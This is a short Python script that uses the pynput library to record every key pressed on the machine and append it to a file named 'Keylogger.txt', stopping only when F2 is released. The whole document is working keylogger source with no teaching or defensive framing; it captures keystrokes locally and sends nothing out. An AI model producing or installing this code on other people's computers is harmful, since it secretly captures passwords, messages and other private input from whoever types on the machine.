from pynput import keyboard


def key_down(key):
    log = open('Keylogger.txt', mode='a')
    try:
        log.write(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log.write(' ')
        elif key == keyboard.Key.backspace:
            log.write(' <del> ')
        elif key == keyboard.Key.shift:
            log.write(' <shift> ')
        elif key == keyboard.Key.ctrl_l:
            log.write(' <ctrl_l> ')
        elif key == keyboard.Key.enter:
            log.write(' <enter> \n')
        else:
            log.write(f' <{key}> ')


def key_up(key):
    if key == keyboard.Key.f2:
        return False


with keyboard.Listener(
        on_press=key_down,
        on_release=key_up) as listener:
    listener.join()
